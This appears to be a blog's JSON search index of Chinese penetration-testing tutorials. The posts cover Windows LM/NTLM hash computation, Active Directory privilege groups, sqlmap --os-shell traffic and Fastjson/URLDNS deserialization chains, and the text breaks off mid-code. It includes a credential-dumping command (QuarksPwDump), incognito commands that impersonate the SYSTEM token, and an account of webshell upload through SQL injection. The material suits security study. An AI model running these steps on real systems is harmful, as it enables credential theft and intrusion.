[{"categories":["内网渗透"],"content":"Windows认证机制和协议 ","date":"2023-08-09","objectID":"/post/347dee3e/:0:0","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"0x1 本地认证 本地认证的意思就是，我们的电脑上存储着我们的账号密码，无论电脑是否联网，只要能开机，就可以输入账号密码登录到电脑中，工作组就是采用本地认证 认证的流程： Windows Logon Process (即winlogon.exe)：是windows NT用户登录程序，用于管理用户登录和退出、用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登录界面 lsass.exe是一个系统进程，用于微软windows系统的安全机制。它用于本地安全和登录策略 SAM文件是位于C:\\Windows\\System32\\config目录下，用于存储本地所有用户的凭证信息，但是着不代表你可以随意去查看系统密码 普通人：不能删、不能改、不能看、不能复制 ","date":"2023-08-09","objectID":"/post/347dee3e/:1:0","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"SAM文件 SAM文件是windows的用户账号数据库，所有用户的登录名及口令等相关信息都会保存在这个文件中，简单概括如下： 注意 格式：username:LM-HASH:NTLM-HASH SAM文件中的密码并不是以明文的形式存在，而是加密后存储在SAM文件中 ","date":"2023-08-09","objectID":"/post/347dee3e/:1:1","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"lsass.exe Lsass exe进程的作用非常重要，它主要负责管理本地安全策略和认证机制。这些策略包括密码策略、账户策略、用户权限、域策略等等。同时，它还负责对用户进行身份验证,以确保只有授权的用户才能访问系统资源 ","date":"2023-08-09","objectID":"/post/347dee3e/:1:2","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"LM-HASH Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。一部分为LM-HASH，另一部分为NTLM-HASH。在Windows操作系统中，HASH的结构通常如下： 注意 username:RID:LM-HASH:NTLM-HASH。 LM Hash的全名为\"LAN Manager Hash\" ,是微软为了提高Windows操作系统的安全性而采用的散列加密算法其本质是DES加密。尽管LM Hash较容易被破解,但为了保证系统的兼容性,Windows只是将LM Hash禁用了(从Windows vista和Windows Server2008版本开始，Windows操作系统默认禁用LM Hash)。LM Hash明文密码被限定在14位以内，也就是说如果要停止使用LM Hash,将用户的密码设置为14位以上即可。如果LM Hash被禁用了攻击者通过工具抓取的LM Hash通常为\"aad3b435b51404eead3b435b51404ee\"(表示LM Hash为空值或被禁用)NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLMHash是基于MD4加密算法进行加密的。个人版从Windows vista以后,服务器版从Windows Server2003以后, Windows操作系统的认证方式均为NTLM Hash 系统支持情况 加密类型 2000 XP 2003 Vista WIN7 2008 WIN8 2012 WIN10 2016 WIN11 LM-HASH ✓ ✓ ✓ ✓ NTLM-HASH ✓ ✓ ✓ ✓ ✓ ✓ ✓ 加密过程 1、将明文口令转换为大写形式，这里以我的明文xr@123.为例，转换成大写： xr@123.-------\u003eXR@123. 2、将字符串大写后转换成16进制字符串 XR@123.-----\u003e5852403132332E 3、密码不足14字节要求用0补齐 5852403132332E----\u003e5852403132332E00000000000000 4、将补齐的编码分成两组7字节 第一组：5852403132332E 第二组：00000000000000 5、将每一组7字节的十六进制转换为二进制，每7bit一组末尾加0， 再转换成十六进制组成得到2组8字节的编码第一组 第一组： 转化为二进制01011000010100100100000000110001001100100011001100101110 每组补加001011000 每组补加000101000 每组补加010010000 每组补加000000110 每组补加000010010 每组补加010010000 每组补加011001100 每组补加001011100 合并0101100000101000100100000000011000010010100100001100110001011100 转换为16进制582890061290cc5c 第二组： 转化为二进制00000000000000000000000000000000000000000000000000000000 每组补加000000000 每组补加000000000 每组补加000000000 每组补加000000000 每组补加000000000 每组补加000000000 每组补加000000000 每组补加000000000 合并0000000000000000000000000000000000000000000000000000000000000000 转换为16进制0000000000000000 6、将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串KGS!@#$%进行加密KGS!@#$%的16进制为4B47532140232425 LM-HASH:2b56571f281783bfaad3b435b51404ee LM-HASH的缺陷 密码不区分大小写。 密码长度最大只能为14个字符。 根据以上的图，可以发现当我们的密码不超过7位时，生成的LM hash后面的一半是固定的为aad3b435b51404ee，也就是说通过观察LM hash，够判断用户的密码是否是大于等于7位。 哈希值没有加盐就进行验证，这使其容易受到中间人的攻击，例如哈希传递，还允许构建彩虹表。 ","date":"2023-08-09","objectID":"/post/347dee3e/:1:3","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"NTLM-HASH NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows vista以后服务器版从Windows Server 2003以后, Windows操作系统的认证方式均为NTLM Hash 加密过程 1、将明文口令转换成十六进制的格式：xr@123.–\u003e7872403132332e 2、将16进制转换成Unicode格式，即在每个字节之后加0x00 7872403132332e–\u003e7800720040003100320033002e00 3、对Unicode字符串作MD4加密，生成32位的十六进制数字串 7800720040003100320033002e00–\u003ec486a1a3f42be056c8b7da50d863b8a1 ","date":"2023-08-09","objectID":"/post/347dee3e/:1:4","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"使用QuarksPwDump 命令：QuarksPwDump.exe –dump-hash-local 我们对比我们前面计算出来的LM-Hash 和 NTLM-HASH是否正确，这里我们看不到LM-Hash为空，是为一个固定值 ","date":"2023-08-09","objectID":"/post/347dee3e/:1:5","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"mimikatz ","date":"2023-08-09","objectID":"/post/347dee3e/:1:6","tags":["本地认证"],"title":"Windows本地认证","uri":"/post/347dee3e/"},{"categories":["内网渗透"],"content":"0x1 工作组权限 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:1:0","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"本地工作组 本地工作组的电脑，所有的账号密码，群组都存放再本地的电脑文件中，不管电脑有没有网络，只要能开机，我们输入的本地的账号密码都能登录到电脑上 在电脑中一般有两种角色，一个是用户一个是组，一个组中可以有多个用户，一个用户可以属于多个组，通过给组划分不同的权限，用户就有了不同的权限 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:1:1","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"本地最高管理员权限 Administrator在计算机中的的意思就是系统超级管理员或超级用户 1、Administrator用户在家庭版的电脑中是属于禁用状态(添加的用户为本地普通管理员)，在专业版中默认属于开启状态，在server机器中属于开启 2、Administrator用户的SID最后一位是500结尾 3、Administrator用户默认在administrators组中 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:1:2","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"本地普通管理员权限 本地一般管理员就是加入了administrators组的管理员但不是administrator用户(job) 下面演示一下，最高管理员与普通管理员的区别(添加新用户) 切换用户到普通管理员job 发生系统错误拒绝访问，有些操作执行不了，因为有UAC的存在，执行高权限的操作必须右键使用管理员打开 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:1:3","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"本地普通用户 本地普通用户，就是在windows电脑中本地新建的普通用户。没有管理员的权限，一般很多操作搜执行不了，需要管理员认证才可以指向，以下是windows用户组，新建的用户一般是默认是user组 当进行高权限的操作时候会出现以下认证(需要输入管理员的账号和密码才可以) ","date":"2023-08-09","objectID":"/post/c8bae9e9/:1:4","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"UAC认证 UAC (User Account Control)，中文翻译为用户帐户控制，是微软在Windows Vista和Windows7中引用 的 新技术，主要功能是进行一些会影响系统安全的操作时，会自动触发UAC，用户确认后才能执行。因为大部分的恶意软件、木马病毒、广告插件在进入计算机时都会有如:将文件复制到Windows或Program Files等目录、安装驱动、安装ActiveX等操作，而这些操作都会触发UAC,用户都可以在UAC提示时来禁止这些程序的运行 许可提示(普通管理员操作)当用户尝试执行需要用户管理访问令牌的任务时，会显示同意提示。下面是UAC同意提示的示例 凭据提示当标准用户(普通用户)尝试执行需要用户管理访问令牌的任务时，会显示凭据提示，还可以要求管理员提供其凭据 UAC的触发条件: 1.修改Windows Update配置; 2.增加或删除用户帐户; 3.改变用户的帐户类型; 4.改变UAC设置; 5.安装ActiveX; 6.安装或卸载程序; 7.安装设备驱动程序; 8.修改和设置家长控制; 9.增加或修改注册表; 10.将文件移动或复制到Program Files或是Windows目录; 11.访问其他用户目录 UAC四种设置要求 UAC设置分为四种，分为始终通知、仅在成俗尝试对我计算机进行更改时通知我、仅当承租尝试更改计算机时通知我(不降低桌面亮度)和从不通知。输入Win+R–\u003emsconfig设置UAC(必须用管理员账号来设置) 默认都为第二档位 我们将它设置为从不通知，我们切换账号到普通管理员(job),再次使用管理员身份打开，许可提示消失 再次切换用户到普通用户xun，发现依然需要提供凭证 这里证明只是提示不出现了，但是UAC认证仍然存在 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:1:5","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"本地系统最高权限(system) system的中文意思是系统，在windows中主要作为系统服务或进程的运行账户 Administrator和system权限区别 并不是说System比Administrator权限大，这两个用户的区别是Administrator是系统内置的管理员用户,一般平时安装、运行程序、修改系统设置等都是以这个权限身份运行的 System权限是系统本身的权限，比如任务管理器里面的winlogon.exe、svchost.exe、alg.exe这些进程等等，另外，注册表里面某些地方只有系统自己可以访问，Administrator用户 也不能访问 充当不同的角色，不能完全去区别谁的权限大 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:1:6","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"0x2 域内机器权限 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:0","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"域内用户权限解读 机器加入到域中，使用域内用户进行登录，域内账户的信息存放在域控(DC)上，添加用户或者修改密码等操作都在域控上进行 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:1","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"管理员组(Administrators) 成员可以不受限制地存取计算机/域的资源。它不仅是最具有权力的一个组，也是在活动目录和域控制器中默认具有管理员权限的组。该组成员可以更改Enterprise Admins、Domian admins 组成员关系，是域森林中强大的服务管理组，从工作组升级成域控后Administrators增加了两个用户组，Enterprise Admins、Domian admins ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:2","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"域管理员组(Domain Admins) 指定的域管理员(域控的本地管理员)，拥有完整的管理员权限。因为该组会被添加到所在域的Administrators组中，因此可以继承Administrator组的所有权限。同时该组默认会被添加到每台域成员计算机的本地Administrators组中，因此Domain admins组获得了域中所有计算机的所有权。下图是域内主机win-08，这样相当于Domain Admins组中成员默认为域内主机的普通管理员 domain Admins中默认会有一个Administrator用户 综上所述，当我们要加一个域管理员用户时，要在域控Domain Admins中添加用户，这样每台域内中上都能用该管理员用户登录使用 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:3","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"企业系统管理员组(Enterprise Admins) 域森林或者根域中的一个组。该组在域森林的每个域中都是Administrators组的成员，因此对所有域控制器都有完全访问权限 如果只是添加域控管理员，可以将用户添加到Enterprise Admins即可 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:4","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"域用户组(Domain users) 所有的域成员。在默认情况下，任何由我们建立的用户账号都属于Domain Users组，该组在域内机器中存在Users组 这里可以看到我们添加的liu用户也默认在该组中，在域控默认添加用户都在Domain users组，Domain Users组，该组在域内机器中存在Users组，这样用户可以当作普通用户登录域内主机 Domain Computers组，任何由我们建立的计算机账号都属于该组(加入域中的主机都在这里) 机器加入到域之后可以选择使用域内用户登录，也可以使用本地用户登录，但是有以下区别 1、本地用户登录，是存放在本地文件中然后本机进行校验。域内用户登录，是要通过DC认证之后才能登录，用户信息放在域控上 2、本地用户登录主要对比的是NTLM HASH值，域认证是通过kerberos认证 3、机器可以选择本地登录或者域用户登录，本地用户 机器名\\用户名,域内用户 域名\\用户名 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:5","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"域内最高管理员权限 域内最高管理员权限是：域名\\administrator,他没有UAC认证，他也是每个域内机器的本地管理员。和机器名\\administrator具有相同权限，SID也是500结尾 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:6","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"域内普通管理员 域内普通管理员就是加入域的Domain Admins组，但是不是administrator用户 与本地的普通管理员权限类似，也有UAC的存在 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:7","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"域内普通用户权限 域用户组(Domain users)中所有的域用户。在默认情况下，任何由我们建立的用户账号都属于Domain Users组，该组在域内机器上存在于Users组 其权限于本地的普通用户权限相同，执行高操作的时候需要UAC认证 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:8","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"机器用户和system的关系 Domain Computers组，任何由我们建立的计算机账号都属于该组,机器账户是指在网络中用于代表计算机或设备的账户。在Windows域环境中，每台计算机都有一个机器账户，用于在网络中进行身份验证和授权。机器账户的名称通常以计算机名称或计算机GUID作为前缀，如\"ZS-PC$\"。 机器账户与具体计算机相关联，用于代表计算机进行域认证和访问域资源。 当电脑加入到域中后机器账号的密码或同步到域控上，所以说本地system用户对应域内的机器用户，如果说我们渗透的电脑加了域，但是使用本地用户进行登录，我们就可以提权到system用户，然后对域内进行查询 虽然\"System\"账户是本地计算机上的特殊账户，而机器账户是域环境中的账户，但在某些情况下，例如当本地计算机需要访问域资源时，“System\"账户 可能会充当机器账户的角色。这是因为在域环境中，本地计算机可以使用\"System\"账户作为其身份进行域认证和访问授权。但需要明确的是，它们仍然是两个不同的概念,“System\"账户不是专门为域中的机器账户而创建的。 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:2:9","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["内网渗透"],"content":"0x3 system查询域内用户实验 实验前提：本地administrator用户密码与域中administrator的密码不能相同，否则是可以查询域内用户的 首先我们使用域内主机的本地administrator用户去查询域内用户 net user /domain 我们可以将提权到system用户来代表机器用户去查询域内用户，因为机器用户，再加入域时被同步到域控上 使用incognito工具实现该实验 列出当前的token令牌列表 incognito.exe list_tokens -u 使用system的令牌 incognito.exe execute -c “NT AUTHORITY\\SYSTEM” cmd whoami可以看到现在是system权限，现在我们再去查询域内用户 成功查询到域内用户，实验完成 ","date":"2023-08-09","objectID":"/post/c8bae9e9/:3:0","tags":["内网"],"title":"内网权限解读","uri":"/post/c8bae9e9/"},{"categories":["常见安全漏洞"],"content":"网站注入漏洞 ","date":"2023-07-21","objectID":"/post/48daf525/:1:0","tags":["SQL注入"],"title":"sqlmap --os-shell原理","uri":"/post/48daf525/"},{"categories":["常见安全漏洞"],"content":"利用条件 知道网站的物理路径 高权限数据库用户 secure_file_priv无限制 网站路径有写入权限 ","date":"2023-07-21","objectID":"/post/48daf525/:1:1","tags":["SQL注入"],"title":"sqlmap --os-shell原理","uri":"/post/48daf525/"},{"categories":["常见安全漏洞"],"content":"注入步骤 选择web网站的语言，默认为ASP 选择写入的路径，我们选2，输入写入的路径 选项一为用这几个路径 选项二为用户自己输入 选项三为用用户的字典 选项四为爆破。 到这就完成了–os-shell的执行，来看看在sqlmap的执行效果 综上所述：大致可以分为三个步骤 1、进行目标的一个基础信息的探测。 2、上传shell到目标web网站上。 3、退出时删除shell。 下面来具体看一下底层流量的执行过程 wireshark捕获数据包，只查看http数据包，流量包如下图，我们分四部分分析 1、sqlmap上传一个上传功能的马 可以看出是利用into outfile进行的文件的写入，下面16进制解码看一下文件内容 解码后可以看出是一个文件上传功能的马 2、通过上传的马进行shell的上传。 可以看出上传了一个文件名为tmpbbkxxv.php的webshell 3、shell传参进行命令执行 使用变量cmd传入whoami命令，返回内容 4、删除shell 删除tmpuyvln.php文件，接着删除它自身，这里可以注意到马的命名规则，tmpuxxxx.php,tmpbxxxx.php ","date":"2023-07-21","objectID":"/post/48daf525/:1:2","tags":["SQL注入"],"title":"sqlmap --os-shell原理","uri":"/post/48daf525/"},{"categories":["Java安全"],"content":"1.fastjson简介 fastjson 是阿里巴巴开发的 java语言编写的高性能 JSON 库，用于将数据在 Json 和 Java Object之间相互转换。它没有用java的序列化机制，而是自定义了一套序列化机制。 主要提供两个接口方法： //序列化：一个 JSON.toJSONString //反序列化：二个 JSON.parseObject/JSON.parse ","date":"2023-06-17","objectID":"/post/288f895f/:1:0","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"1.1 简单示例 注意 只有符合Java Bean格式的对象才能Fastjson被转为JSON 创建一个Person类 public class Person { public String name; public int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } ParseObject与Parse使用对比 import com.alibaba.fastjson.JSON; public class test { public static void main(String[] args) { //创建一个Java Bean对象 Person person = new Person(); person.setName(\"106\"); person.setAge(18); System.out.println(\"--------------序列化-------------\"); //将其序列化为JSON String JSON_Serialize = JSON.toJSONString(person); System.out.println(JSON_Serialize); System.out.println(\"-------------反序列化-------------\"); //使用parse方法，将JSON反序列化为一个JSONObject Object o1 = JSON.parse(JSON_Serialize); System.out.println(o1.getClass().getName()); System.out.println(o1); System.out.println(\"-------------反序列化-------------\"); //使用parseObject方法，将JSON反序列化为一个JSONObject Object o2 = JSON.parseObject(JSON_Serialize); System.out.println(o2.getClass().getName()); System.out.println(o2); System.out.println(\"-------------反序列化-------------\"); //使用parseObject方法，并指定类，将JSON反序列化为一个指定的类对象 Object o3 = JSON.parseObject(JSON_Serialize,Person.class); System.out.println(o3.getClass().getName()); System.out.println(o3); } } 运行结果 反序列化时不指定特定的类，那么Fastjosn就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中private类型的属性值，Fastjson默认不会将其序列化和反序列化 ","date":"2023-06-17","objectID":"/post/288f895f/:1:1","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"1.2 @type参数 使用Fastjson中toJSONString进行序列化如果没有其他额外参数就会将将一个Java Bean转换成JSON字符串 String JSON_Serialize = JSON.toJSONString(person); System.out.println(JSON_Serialize); //输出 //{\"age\":18,\"name\":\"106\"} 进行反序列化，JSON字符串反序列化成Java Object，可以使用parse()方法。该方法默认将JSON字符串反序列化为一个JSONObject对象。 Object o1 = JSON.parse(JSON_Serialize); System.out.println(o1.getClass().getName()); //com.alibaba.fastjson.JSONObject System.out.println(o1); //{\"name\":\"Faster\",\"age\":18} 那么现在出现一个问题，如何将JSON字符串反序列化成我们原始的的类：有两个办法 添加SerializerFeature.WriteClassName属性 使用parseObject()方法指定对象的类型 下面依次演示两种方法： 1.添加额外属性 String JSON_Serialize = JSON.toJSONString(person); System.out.println(JSON_Serialize); //{\"age\":18,\"name\":\"106\"} //添加额外属性 String JSON_type = JSON.toJSONString(person, SerializerFeature.WriteClassName); System.out.println(JSON_type); //{\"@type\":\"Person\",\"age\":18,\"name\":\"106\"} 对比不添加属性，发现JSON字符串中增加了一个@type字段，用于标识对象所属的类(1.2.25及之后的版本，禁用了部分autotype的功能) String JSON_str = \"{\\\"@type\\\":\\\"Person\\\",\\\"age\\\":18,\\\"name\\\":\\\"106\\\"}\"; System.out.println(JSON.parse(JSON_str)); //Person@6477463f 2.使用parseObject()方法指定对象的类型 //使用parseObject方法，并指定类，将JSON反序列化为一个指定的类对象 Object o3 = JSON.parseObject(JSON_Serialize,Person.class); System.out.println(o3); //Person@3d71d552 ","date":"2023-06-17","objectID":"/post/288f895f/:1:2","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"1.3 执行过程 序列化： 使用toJSONString方法序列化时会自动调用get方法，其本质就是调用get方法获得对象属性，生成JSON字符串 反序列化： 1.指定@type为Person，使用parse方法 String JSON_str = \"{\\\"@type\\\":\\\"Person\\\",\\\"age\\\":18,\\\"name\\\":\\\"106\\\"}\"; System.out.println(JSON.parse(JSON_str)); 根据输出结果来看反序列化时先调用@type标识的类的构造函数，然后再调用set方法给对象赋值 2.指定@type为Person，使用parseObject方法 String JSON_str = \"{\\\"@type\\\":\\\"Person\\\",\\\"age\\\":18,\\\"name\\\":\\\"106\\\"}\"; Object o3 = JSON.parseObject(JSON_str); System.out.println(o3); 技巧 parseObject()只是对于parse()做了封装，判断返回的对象是否为JSONObject实例并强转为JSONObject类。 public static JSONObject parseObject(String text) { Object obj = parse(text); return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj); } 根据结果可以看到返回了一个JSON Object对象，同时调用了构造方法、set、get方法，实际上是toJSON调用的get方法 3.不使用@type，使用parseObject方法 调用了构造方法和set方法 ","date":"2023-06-17","objectID":"/post/288f895f/:1:3","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"1.4 反序列化过程 第一步：进入parse方法 public static Object parse(String text) { //调用了另一个方法重载 return parse(text, DEFAULT_PARSER_FEATURE); } public static Object parse(String text, int features) { if (text == null) { return null; } else { //创建并初始化DefaultJSONParer解析器 DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); Object value = parser.parse(); parser.handleResovleTask(value); parser.close(); return value; } } 先跟进DefaultJSONParser，作用是对对输入的数据进行封装，在DefaultJSONParser中会对输入的json字符串进行判断如果开头是\"{“给一个token值为12，如果是”[“给值14,在这里我们的token的值为12 public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) { //此处省略一段代码 int ch = lexer.getCurrent(); if (ch == '{') { lexer.next(); ((JSONLexerBase)lexer).token = 12; } else if (ch == '[') { lexer.next(); ((JSONLexerBase)lexer).token = 14; } else { lexer.nextToken(); } } 返回之后紧接着进入DefaultJSONParser类中的parse方法Object value = parser.parse(); public Object parse(Object fieldName) { //先将上一步DefaultJSONParser封装的结果赋值给lexer JSONLexer lexer = this.lexer; //会对token进行判断来执行不同的操作，Token值为12，创建了一个JSONObject对象 switch (lexer.token()) { //省略若干行代码 case 12: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return this.parseObject((Map)object, fieldName); //省略若干行代码 } } 接着跟进parseObject方法，161-170行对空白字符进行了过滤 while(true) { lexer.skipWhitespace(); char ch = lexer.getCurrent(); if (lexer.isEnabled(Feature.AllowArbitraryCommas)) { while(ch == ',') { lexer.next(); lexer.skipWhitespace(); ch = lexer.getCurrent(); } } if (key == JSON.DEFAULT_TYPE_KEY \u0026\u0026 !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) { //读取到类名 ref = lexer.scanSymbol(this.symbolTable, '\"'); //用loadClass加载类 Class\u003c?\u003e clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader()); 进入loadClass方法，可以看到是有一些对字符的处理，这里可以作为我们黑名单绕过的一个利用点 if (clazz != null) { return clazz; } else if (className.charAt(0) == '[') { Class\u003c?\u003e componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } else if (className.startsWith(\"L\") \u0026\u0026 className.endsWith(\";\")) { String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); 加载返回类，并将类放入map中 try { ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if (contextClassLoader != null) { clazz = contextClassLoader.loadClass(className); mappings.put(className, clazz); return clazz; } } catch (Throwable var5) { } 返回可以看到要根据class创建反序列化器，用反序列化器再去反序列化 ObjectDeserializer deserializer = this.config.getDeserializer(clazz); //用反序列化器去反序列化 thisObj = deserializer.deserialze(this, clazz, fieldName); return thisObj; 跟进getDeserializer方法，根据判断条件，derializer为空，type为class执行进入getDeserializer((Class)type, type) public ObjectDeserializer getDeserializer(Type type) { ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type); if (derializer != null) { return derializer; } else if (type instanceof Class) { return this.getDeserializer((Class)type, type); } else if (type instanceof ParameterizedType) { Type rawType = ((ParameterizedType)type).getRawType(); return rawType instanceof Class ? this.getDeserializer((Class)rawType, type) : this.getDeserializer(rawType); } else { return JavaObjectDeserializer.instance; } } 我们接着跟入getDeserializer重载方法，这里有黑名单，内容为java.lang.Thread for(int i = 0; i \u003c this.denyList.length; ++i) { String deny = this.denyList[i]; if (className.startsWith(deny)) { throw new JSONException(\"parser deny : \" + className); } } 没有匹配到对应的反序列化器，调用createJavaBeanDeserializer方法去创建 走进这个方法，我们前面快速步过，到这里走到了build，这个beanInfo保存了Person类里面的所有方法和一些变量以及构造方法 进入build方法，通过Java反射获取类的相关方法和成员变量字段，和无参构造方法 接着后面会对所有方法进行遍历找到符合要求的方法后续反序列化时自动调用 for(i = 0; i \u003c var29; ++i) { method = var30[i]; ordinal = 0; int serialzeFeatures = 0; parserFeatures = 0; String methodName = method.getName(); if (methodName.length() \u003e= 4 \u0026\u0026 !Modifier.isStatic(method.getModifiers()) \u0026\u0026 (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClas","date":"2023-06-17","objectID":"/post/288f895f/:1:4","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"2.fastjson反序列化漏洞 ","date":"2023-06-17","objectID":"/post/288f895f/:2:0","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"2.1 漏洞产生原因 根据上面的执行过程分析我们了解到反序列化时指定@type，parse和parseObject会调用相应类的get、set方法，这种autotype机制会导致如果在@type标识的类中的set或get方法存在恶意代码，那么就有可能导致fastjson反序列化漏洞。 ","date":"2023-06-17","objectID":"/post/288f895f/:2:1","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"2.2 利用链 2.2.1 Fastjson\u003c=1.2.24 该版本下有两条利用链：JdbcRowSetImpl和Templateslmpl JdbcRowSetImpl利用链 该利用链最终是结合JNDI注入来完成攻击过程，JDK版本限制和JNDI类似 调试分析 了解了具体的反序列过程和特性，我们可以现在JdbcRowSetImpl：setDataSourceName和setAutoCommit方法下断点 执行到setDataSourceName方法，可以看到var1是我们的playload中dataSourceName的值 进入到父类的setDataSourceName方法，将name赋值给dataSource autoCommit我们设置了值，所以这里就会进入connect方法 this.getDataSourceName()的返回值是我们传入的rmi地址这就造成了JDNI结合RMI的远程恶意代码执行 Templateslmpl链和高版本绕过在后续更新。。。 ","date":"2023-06-17","objectID":"/post/288f895f/:2:2","tags":["Javasec"],"title":"Fastjson反序列化漏洞分析","uri":"/post/288f895f/"},{"categories":["Java安全"],"content":"1、URLDNS原理 1、 java.util.HashMap重写了readObject方法： 在反序列化时会调用 hash 函数计算 key 的 hashCode 2、java.net.URL对象的 hashCode 在计算时会调用 getHostAddress 方法 3、getHostAddress方法从而解析域名发出 DNS 请求 利用链： Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() 接下来进行逐一分析： 这个链反序列化的对象是HashMap的对象。反序列化HashMap的时候会用到这个类自定义的readObject： private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor \u003c= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\"Illegal load factor: \" + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u003c 0) throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); else if (mappings \u003e 0) { // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u003c DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u003e= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u003c MAXIMUM_CAPACITY \u0026\u0026 ft \u003c MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\"rawtypes\",\"unchecked\"}) Node\u003cK,V\u003e[] tab = (Node\u003cK,V\u003e[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) 